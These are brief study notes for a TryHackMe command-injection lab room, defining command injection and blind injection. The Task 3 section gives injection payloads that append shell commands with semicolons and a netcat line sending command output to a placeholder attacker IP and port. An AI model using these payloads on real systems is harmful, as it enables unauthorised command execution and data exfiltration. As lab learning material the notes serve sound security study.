# Room
https://tryhackme.com/room/injection

# Task 1 - Deploy
Deploy VM

# Task 2 - Intro
Command Injection occurs when server side code like PHP that is housed in a web application makes a system call on the hosting machine

# Task 3 - Blind Command Injection
Blind command injection occurs when the system call doesn't return a response

* How to tell if you have blind command injection
  * Ping
    * If you send 10 pings and the response is delayed about 10 seconds there is a good chance you have blind command injection
  * Redirect output
    * Use output redirection to write a file, then try to browse for that file
  * Bypass using netcat
    * ls -la | nc [attacker_ip] [attacker_port]

Examples
```
; ping -c 10 127.0.0.1
; uname -r > k.txt
```